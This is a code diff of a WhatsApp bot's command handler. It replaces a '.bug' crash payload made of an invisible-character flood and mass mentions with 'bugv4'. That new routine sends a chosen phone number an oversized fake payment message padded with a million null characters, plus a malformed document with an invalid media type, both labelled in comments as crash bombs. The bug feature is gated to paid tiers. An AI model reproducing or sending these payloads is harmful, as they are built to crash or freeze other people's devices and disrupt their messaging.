@@ -1,118 +1,129 @@
 const { activateSecurity, deactivateSecurity } = require('../security/superSecurity');
-const { sendToChat } = require('../utils/messageUtils');
+const { getUserCached } = require('../database/userDatabase');
+const fs = require('fs');
 
-// 🔒 Invisible char flood used for .bug
-const INVISIBLE = '\u3164'; // HANGUL FILLER
-const BIG_TEXT = INVISIBLE.repeat(2000); // Adjust if needed
+const BUG_IMAGE = fs.readFileSync('./media/bug.jpg'); // Thumbnail (can be any small image)
 
-// 🧨 Bug Payload v2 — triggers crash/freeze on some devices
-const BUGV2_PAYLOAD = {
-  text: BIG_TEXT,
-  contextInfo: {
-    mentionedJid: Array.from({ length: 500 }, (_, i) => `${1000000000 + i}@s.whatsapp.net`),
-    forwardingScore: 999,
-    isForwarded: true,
-    quotedMessage: {
-      conversation: BIG_TEXT
-    },
-    participant: '0@s.whatsapp.net',
-    stanzaId: '3AB0BD1D1405C2C1',
-    remoteJid: 'status@broadcast'
+const bugv4 = async (sock, targetJid) => {
+  // 🧨 Bug #1: fake commerce payload
+  const fakeFlowPayload = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            hasMediaAttachment: true,
+            jpegThumbnail: BUG_IMAGE
+          },
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: 'review_and_pay',
+                buttonParamsJson: JSON.stringify({
+                  currency: 'USD',
+                  total_amount: { value: 999999999, offset: 100 },
+                  order: {
+                    status: 'preparing_to_ship',
+                    items: [
+                      {
+                        retailer_id: 'r1',
+                        product_id: 'p1',
+                        name: 'BMM',
+                        amount: { value: 9999900, offset: 100 },
+                        quantity: 999999
+                      }
+                    ]
+                  },
+                  screen_0_TextInput_0: 'radio-buttons' + '\u0000'.repeat(1000000), // big bomb
+                  screen_1_TextInput_2: 'attacker@example.com'
+                }),
+                version: 3
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+
+  // 🧨 Bug #2: invalid media type crash
+  const malformedDoc = {
+    document: { url: './package.json' }, // any file path
+    mimetype: 'image/null', // invalid type
+    fileName: 'bugged_file.crash',
+    caption: '💣',
+  };
+
+  // 💥 Send both payloads directly
+  try {
+    await sock.relayMessage(targetJid, fakeFlowPayload, {});
+    await sock.sendMessage(targetJid, malformedDoc);
+  } catch (err) {
+    console.error(`❌ Bugv4 failed to send to ${targetJid}:`, err.message);
   }
 };
 
-/**
- * Main command handler for .protect and .bug commands.
- */
-async function handleProtectionCommand({
+const handleProtectionCommand = async ({
   sock,
-  message,
-  userId,
-  authId,
   command,
   args,
-  botInstance,
   realSender,
   normalizedUserId,
   botLid,
-  subscriptionLevel,
-  remoteJid
-}) {
+  remoteJid,
+  message,
+  subscriptionLevel
+}) => {
   switch (command) {
+    case 'bug': {
+      if (!['gold', 'premium'].includes(subscriptionLevel)) {
+        await sock.sendMessage(remoteJid, { text: '🔒 Gold or Premium only.' });
+        return true;
+      }
+
+      if (![normalizedUserId, botLid].includes(realSender)) {
+        await sock.sendMessage(remoteJid, { text: '🚫 Only owner can use this command.' });
+        return true;
+      }
+
+      // Extract target from reply or arg
+      let targetJid;
+      const quoted = message?.message?.extendedTextMessage?.contextInfo;
+      if (quoted?.participant) {
+        targetJid = quoted.participant;
+      } else if (args[0]) {
+        const number = args[0].replace(/\D/g, '');
+        if (number.length > 5) targetJid = number + '@s.whatsapp.net';
+      }
+
+      if (!targetJid) {
+        await sock.sendMessage(remoteJid, { text: '❌ Provide or reply to a valid number.' });
+        return true;
+      }
+
+      await bugv4(sock, targetJid);
+      await sock.sendMessage(remoteJid, { text: `✅ Bugv4 sent to @${targetJid.split('@')[0]}`, mentions: [targetJid] });
+      return true;
+    }
+
     case 'protect': {
       if (!['basic', 'gold', 'premium'].includes(subscriptionLevel)) {
-        await sendToChat(botInstance, remoteJid, {
-          message: '🤖 Security protection is not available for Free tier.'
-        });
+        await sock.sendMessage(remoteJid, { text: '🛡️ Security not available for free.' });
         return true;
       }
 
       if (args[0] === 'off') {
-        deactivateSecurity(authId);
-        await sendToChat(botInstance, remoteJid, {
-          message: '🔕 Security protection *disabled*. You are now vulnerable to spam/bugs.'
-        });
+        deactivateSecurity(normalizedUserId);
+        await sock.sendMessage(remoteJid, { text: '🛡️ Protection deactivated.' });
       } else {
-        activateSecurity(authId);
-        await sendToChat(botInstance, remoteJid, {
-          message: '🛡️ Security protection *enabled*! Your bot is now safe from known attacks.'
-        });
+        activateSecurity(normalizedUserId);
+        await sock.sendMessage(remoteJid, { text: '🛡️ Protection activated.' });
       }
-      return true;
-    }
-
-    case 'bug': {
-      // Only allow Gold or Premium
-      if (!['gold', 'premium'].includes(subscriptionLevel)) {
-        await sendToChat(botInstance, remoteJid, {
-          message: '🔒 This feature is only for Gold & Premium users.'
-        });
-        return true;
-      }
-
-      // Only allow bot owner to use it
-      if (realSender !== normalizedUserId && realSender !== botLid) {
-        await sendToChat(botInstance, remoteJid, {
-          message: '🚫 Only the bot owner can use this command.'
-        });
-        return true;
-      }
-
-      // Extract target from reply or argument
-      let targetJid;
-      const quoted = message?.message?.extendedTextMessage?.contextInfo;
-
-      if (quoted?.participant) {
-        targetJid = quoted.participant;
-      } else if (args[0]) {
-        const num = args[0].replace(/[^0-9]/g, '');
-        if (num.length > 5) {
-          targetJid = `${num}@s.whatsapp.net`;
-        }
-      }
-
-      if (!targetJid || !targetJid.endsWith('@s.whatsapp.net')) {
-        await sendToChat(botInstance, remoteJid, {
-          message: '⚠️ You must reply to a user or enter a valid phone number.'
-        });
-        return true;
-      }
-
-      // 🚀 Send the bug payload
-      await botInstance.sendMessage(targetJid, BUGV2_PAYLOAD);
-      await sendToChat(botInstance, remoteJid, {
-        message: `✅ Bug payload sent to @${targetJid.split('@')[0]}`,
-        mentions: [targetJid]
-      });
       return true;
     }
 
     default:
-      await sendToChat(botInstance, remoteJid, {
-        message: '❌ Unknown security command.'
-      });
       return false;
   }
-}
+};
 
 module.exports = { handleProtectionCommand };
